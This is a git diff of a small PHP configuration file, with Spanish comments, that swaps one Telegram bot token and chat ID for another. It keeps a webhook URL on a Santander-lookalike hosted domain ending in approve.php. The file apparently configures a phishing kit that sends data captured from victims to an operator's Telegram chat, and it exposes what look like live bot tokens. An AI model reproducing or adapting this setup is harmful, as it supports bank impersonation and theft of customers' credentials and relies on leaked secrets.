@@ -11,7 +11,7 @@ if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
 }
 
 // ⚙️ Configuración principal (solo accesible por inclusión)
-$bot_token_2 = '8045219750:AAEvUarc0qdeWJRmzkOVQ4gBpBrB1I6RDH0';  
-$chat_id_2   = '-5289462105';
+$bot_token_2 = '7903742862:AAGNfBL9jG4HUXuhmjww-rlhgpbS7QnbSEU';  
+$chat_id_2   = '-5259753959';
 $webhook_url = 'https://creditsantander.up.railway.app/approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
 ?>
